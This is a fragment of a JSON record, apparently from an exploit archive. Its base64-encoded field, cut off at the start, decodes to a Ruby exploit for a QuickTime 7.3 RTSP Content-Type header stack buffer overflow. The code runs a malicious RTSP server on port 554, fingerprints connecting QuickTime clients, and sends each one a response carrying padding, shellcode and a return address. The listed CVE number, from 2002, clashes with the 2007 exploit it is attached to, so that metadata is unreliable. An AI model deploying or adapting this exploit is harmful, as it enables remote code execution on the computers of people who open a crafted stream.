WF0aW9uIGlzIGV4dHJhY3RlZCBmcm9tIHRoZSB0YXJnZXQgbWF0cml4IHZhcmlhYmxlLg0KICBkZWYgYnVpbGRfcGF5bG9hZCh0YXJnZXQpDQogICAgdGFyZ2V0X25hbWUgPSAiI3t0YXJnZXRbOnZlcnNpb25dfS0je3RhcmdldFs6b3NdfS0je3RhcmdldFs6YXJjaF19Ig0KICAgIHNlbGVjdGVkICAgID0gVEFSR0VUX01BVFJJWFt0YXJnZXRfbmFtZV0NCiAgICB1bmxlc3Mgc2VsZWN0ZWQNCiAgICAgIE1pc2NVdGlsczo6bXlwdXRzICJUYXJnZXQgbm90IGF2YWlsYWJsZSwgY2hlY2sgVXNlci1BZ2VudCBmb3JtYXQhIg0KICAgICAgIE1pc2NVdGlsczo6bXlwdXRzIHRhcmdldF9uYW1lDQogICAgICByZXR1cm4gJycNCiAgICBlbmQNCiAgICANCiAgICBNaXNjVXRpbHM6Om15cHV0cyAiQnVpbGRpbmcgcGF5bG9hZCBmb3IgJyN7dGFyZ2V0X25hbWV9Jy4uLiINCiAgICBNaXNjVXRpbHM6Om15cHV0cyAiUmV0dXJuIGFkZHJlc3M6ICN7c3ByaW50ZigiMHglMDh4IixzZWxlY3RlZFs6cmV0X2FkZHJlc3NdKX0sICIgKw0KICAgICAgICAgICAgICAgICAgICAgICJzaGVsbGNvZGU6ICN7c2VsZWN0ZWRbOnNoZWxsY29kZV0uc2l6ZX0gYnl0ZXMuIg0KICAgIA0KICAgIHBheWxvYWQgPSBTdHJpbmcucmFuZF9hbHBoYShzZWxlY3RlZFs6cGFkZGluZ19zaXplXS1zZWxlY3RlZFs6c2hlbGxjb2RlXS5zaXplKQ0KICAgIA0KICAgIHVubGVzcyB0YXJnZXRbOm9zXSA9fiAvV2luZG93cy8NCiAgICAgIHBheWxvYWQgPDwgc2VsZWN0ZWRbOnNoZWxsY29kZV0NCiAgICAgIHBheWxvYWQgPDwgc2VsZWN0ZWRbOnByZXBlbmRfZGF0YV0NCiAgICAgIA0KICAgICAgIyBIYW5kbGUgYmlnLWVuZGlhbiAvIGxpdHRsZS1lbmRpYW4NCiAgICAgIGlmIHRhcmdldFs6YXJjaF0gPT0gIlBQQyINCiAgICAgICAgcGF5bG9hZCA8PCBbc2VsZWN0ZWRbOnJldF9hZGRyZXNzXV0ucGFjaygiTiIpDQogICAgICBlbHNlDQogICAgICAgIHBheWxvYWQgPDwgW3NlbGVjdGVkWzpyZXRfYWRkcmVzc11dLnBhY2soIlYiKQ0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgcGF5bG9hZCA8PCBzZWxlY3RlZFs6cHJlcGVuZF9kYXRhXQ0KICAgICAgcGF5bG9hZCA8PCBbc2VsZWN0ZWRbOnJldF9hZGRyZXNzXV0ucGFjaygiViIpDQogICAgICBwYXlsb2FkIDw8IHNlbGVjdGVkWzpzaGVsbGNvZGVdDQogICAgZW5kDQogICAgDQogICAgIyBBcHBlbmRlZCBkYXRhIGNvbWVzIGFsd2F5cyBhdCBlbmQgb2YgcGF5bG9hZA0KICAgIHBheWxvYWQgPDwgc2VsZWN0ZWRbOmFwcGVuZF9kYXRhXQ0KICAgIA0KICAgIE1pc2NVdGlsczo6bXlwdXRzICJQYXlsb2FkOiAje3BheWxvYWQuc2l6ZX0gYnl0ZXMgKHBhZGRpbmc9I3twYXlsb2FkWzAsOF19Li4uKSINCiAgICANCiAgICByZXR1cm4gcGF5bG9hZA0KICBlbmQNCiAgDQogICMgVGhyZWFkZWQgJ2xpc3RlbmVyJzogd2FpdHMgdW50aWwgYSBRdWlja3RpbWUgY2xpZW50IGNvbm5lY3RzIGFuZCBmaW5nZXJwcmludHMNCiAgIyBpdHMgdmVyc2lvbiwgYXJjaGl0ZWN0dXJlIGFuZCBvcGVyYXRpbmcgc3lzdGVtIHZlcnNpb24uIEJ1aWxkcyBhIHJlc3BvbnNlIHdpdGgNCiAgIyB0aGUgY29ycmVjdCBwYXlsb2FkIGFuZCBzZW5kcyBpdCBiYWNrIHRvIHRoZSBjbGllbnQuDQogIGRlZiBleHBsb2l0DQogICAgbG9vcCBkbw0KICAgICAgc29ja2V0ID0gQHNlcnZlci5hY2NlcHQNCiAgICAgIFRocmVhZC5zdGFydCBkbw0KICAgICAgICBzICAgID0gc29ja2V0DQogICAgICAgIHBvcnQgPSBzLnBlZXJhZGRyWzFdDQogICAgICAgIG5hbWUgPSBzLnBlZXJhZGRyWzJdDQogICAgICAgIGFkZHIgPSBzLnBlZXJhZGRyWzNdDQogICAgICAgIA0KICAgICAgICBNaXNjVXRpbHM6Om15cHV0cyAiUlRTUCBDb25uZWN0aW9uIGZyb20gI3tuYW1lfSAoI3thZGRyfToje3BvcnR9KSINCiAgICAgICAgDQogICAgICAgIHJlcXVlc3QgPSBzLnJlY3YoMTAyNCkNCiAgICAgICAgIyBWZXJpZnkgaXQncyBRdWlja3RpbWUgYW5kIG5vdCBzb21lIG90aGVyIGFwcGxpY2F0aW9uDQogICAgICAgICMgaWUuIFF1aWNrVGltZSBFLS83LjMgKHF0dmVyPTcuMztvcz1XaW5kb3dzIE5UIDYuMCkNCiAgICAgICAgaWYgcmVxdWVzdCA9fiAvVXNlci1BZ2VudDogUXVpY2tUaW1lL2kNCiAgICAgICAgICB0YXJnZXQgPSBIYXNoLm5ldw0KICAgICAgICAgIA0KICAgICAgICAgIGlmIHJlcXVlc3QgPX4gL1dpbmRvd3MvDQogICAgICAgICAgICBxdHZlciA9IHJlcXVlc3Quc2NhbigvXChxdHZlcj0oLis/KTtvcz0oLis/KVwpXHJcbi8pLmZsYXR0ZW4NCiAgICAgICAgICAgIHRhcmdldFs6dmVyc2lvbl0gPSBxdHZlclswXQ0KICAgICAgICAgICAgdGFyZ2V0WzphcmNoXSAgICA9ICJJQTMyIg0KICAgICAgICAgICAgdGFyZ2V0Wzpvc10gICAgICA9IHF0dmVyWzFdDQogICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcXR2ZXIgPSByZXF1ZXN0LnNjYW4oL1wocXR2ZXI9KC4rPyk7Y3B1PSguKz8pO29zPSguKz8pXClcclxuLykuZmxhdHRlbg0KICAgICAgICAgICAgdGFyZ2V0Wzp2ZXJzaW9uXSA9IHF0dmVyWzBdDQogICAgICAgICAgICB0YXJnZXRbOmFyY2hdICAgID0gcXR2ZXJbMV0NCiAgICAgICAgICAgIHRhcmdldFs6b3NdICAgICAgPSBxdHZlclsyXQ0KICAgICAgICAgIGVuZA0KICAgICAgICAgIA0KICAgICAgICAgIE1pc2NVdGlsczo6bXlwdXRzICJSVFNQIFJlcXVlc3QgZnJvbSBRdWlja3RpbWU6ICN7cXR2ZXJbMF19IG9uICN7cXR2ZXJbM119ICN7cXR2ZXJbMl19Ig0KICAgICAgICAgIA0KICAgICAgICAgICMgQnVpbGQgcGF5bG9hZCBhbmQgdGhlIGZ1bGwgcmVzcG9uc2UgYm9keQ0KICAgICAgICAgIGJlZ2luDQogICAgICAgICAgICBwYXlsb2FkID0gYnVpbGRfcGF5bG9hZCh0YXJnZXQpDQogICAgICAgICAgICBib2R5ICAgID0gbWFrZV9ib2R5KCkNCiAgICAgICAgICAgIGhlYWRlciAgPSBtYWtlX2hlYWRlcihib2R5LnNpemUsIHBheWxvYWQpDQogICAgICAgICAgICByZXNwICAgID0gKGhlYWRlcitib2R5KQ0KICAgICAgICAgIHJlc2N1ZQ0KICAgICAgICAgICAgcmFpc2UgIlNvbWV0aGluZyBoYXBwZW5lZCB0cnlpbmcgdG8gYnVpbGQgYSByZXNwb25zZSEiDQogICAgICAgICAgZW5kDQogICAgICAgICAgDQogICAgICAgICAgIyBTZW5kIGl0IHRvIHRoZSBjbGllbnQNCiAgICAgICAgICBzLndyaXRlKHJlc3ApDQogICAgICAgICAgDQogICAgICAgICAgTWlzY1V0aWxzOjpteXB1dHMgIlJUU1AgU2VudCAje3Jlc3Auc2l6ZX0gYnl0ZXMuLi4iDQogICAgICAgIGVsc2UNCiAgICAgICAgICAjIEl0J3Mgbm90IGEgUXVpY2t0aW1lIGNsaWVudA0KICAgICAgICAgIE1pc2NVdGlsczo6bXlwdXRzICJSVFNQIENvbm5lY3Rpb24gZG9lc24ndCBzZWVtIHRvIGNvbWUgZnJvbSBRdWlja3RpbWUhIg0KICAgICAgICAgIHMud3JpdGUoU3RyaW5nLnJhbmRfYWxwaGEocmFuZCg1MDApKSkNCiAgICAgICAgZW5kDQogICAgICBlbmQNCiAgICBlbmQNCiAgZW5kDQogIA0KICAjIEluaXRpYWxpemUgdGhlIGV4cGxvaXQgd2l0aCB0aGUgbG9jYWwgbGlzdGVuaW5nIHBvcnQsIHNlcnZlciBzb2NrZXQsIGV0Yy4NCiAgZGVmIGluaXRpYWxpemUocnRzcF9wb3J0ID0gNTU0KQ0KICAgIEBzZXJ2ZXIgPSBUQ1BTZXJ2ZXIubmV3KCIwLjAuMC4wIiwgcnRzcF9wb3J0KQ0KICAgIEBtcGZpbGUgPSBTdHJpbmcucmFuZF9hbHBoYShyYW5kKDEyKSsxKSArICcubXAzJw0KICAgIA0KICAgIHJ0c3BfYWRkcnMgID0gQHNlcnZlci5hZGRyWzIuLi0xXS51bmlxLmNvbGxlY3R7fGF8IiN7YX06I3tydHNwX3BvcnR9In0uam9pbignICcpDQogICAgTWlzY1V0aWxzOjpteXB1dHMgIlJUU1AgTGlzdGVuaW5nIG9uICN7cnRzcF9hZGRyc30sIHNlcnZpbmcgI3tAbXBmaWxlfSINCiAgICBNaXNjVXRpbHM6Om15cHV0cyAiUlRTUCBVUkw6IHJ0c3A6Ly8je3J0c3BfYWRkcnN9LyN7QG1wZmlsZX0iDQogIGVuZA0KZW5kDQplbmQNCg0KdHJhcCgiSU5UIikgZG8NCiAgcHV0cyAiRXhpdGluZyEiDQogIGV4aXQNCmVuZA0KDQpwdXRzICJRdWlja3RpbWUgNy4zIFJUU1AgUmVzcG9uc2UgQ29udGVudC1UeXBlIEhlYWRlciBTdGFjayBCdWZmZXIgT3ZlcmZsb3cgZXhwbG9pdCINCnB1dHMgIkNvcHlyaWdodCAoQykgMjAwNywgU3VicmVwdGlvbiBMTEMuIEFsbCByaWdodHMgcmVzZXJ2ZWQuIg0KdGVzdF9ydW4gPSBBcHBsZU9TWDo6UXVpY2t0aW1lUmVkdXgubmV3KCkNCnRlc3RfcnVuLmV4cGxvaXQNCg0KIyBtaWx3MHJtLmNvbSBbMjAwNy0xMS0yOV0=", 
    "filename": "platforms/multiple/remote/4673.rb", 
    "id": "4673", 
    "cves": [
        "CVE-2002-0252"
    ]
}